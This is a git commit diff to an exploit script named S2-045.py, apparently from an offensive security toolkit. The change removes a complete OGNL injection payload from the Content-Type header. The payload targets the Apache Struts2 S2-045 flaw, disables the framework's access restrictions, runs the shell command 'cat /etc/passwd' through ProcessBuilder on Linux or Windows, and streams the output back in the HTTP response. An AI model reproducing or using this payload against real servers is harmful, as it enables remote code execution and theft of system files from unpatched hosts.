8ad3f30101681ea561eb482c5dd95ff9776455b0
S4kur4 <2570160655@qq.ccom>
2017-03-07 21:57:28 +0800

    a little change
    a little change

--- exps/S2-045.py
+++ exps/S2-045.py
@@ -14,20 +14,7 @@ header1 = {
     "Accept" : "*/*",
     "X-Requested-With" : "XMLHttpRequest",
     "Accept-Encoding" : "deflate",
-    "Accept-Language" : "zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4",
-    "Content-Type" : '''%{(#nike='multipart/form-data').
-    (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
-    (#_memberAccess?(#_memberAccess=#dm):
-    ((#container=#context['com.opensymphony.xwork2.ActionContext.container']).
-    (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
-    (#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).
-    (#context.setMemberAccess(#dm)))).(#cmd='cat /etc/passwd').
-    (#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).
-    (#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).
-    (#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).
-    (#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().
-    getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).
-    (#ros.flush())}'''
+    "Accept-Language" : "zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4"
     }
 
 def main():
